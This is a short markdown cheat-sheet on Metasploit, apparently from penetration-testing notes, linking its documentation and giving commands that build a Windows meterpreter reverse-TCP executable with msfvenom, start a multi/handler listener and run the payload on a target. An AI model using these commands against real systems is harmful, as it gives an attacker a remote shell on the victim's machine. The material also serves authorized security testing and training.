# Metasploit

- [Metasploit](#metasploit)
  - [msfvenom](#msfvenom)
  - [Reverse shell handler](#reverse-shell-handler)

> **Github:** https://github.com/rapid7/metasploit-framework
> **Documentations:** https://docs.metasploit.com/

## msfvenom

Msfvenom is a Metasploit standalone payload generator.

> **Cheatsheet:** https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

## Reverse shell handler

```bash
# create payload and upload it on the target
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe > rs.exe

# Host - msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
run 

# target
.\rs.exe
```
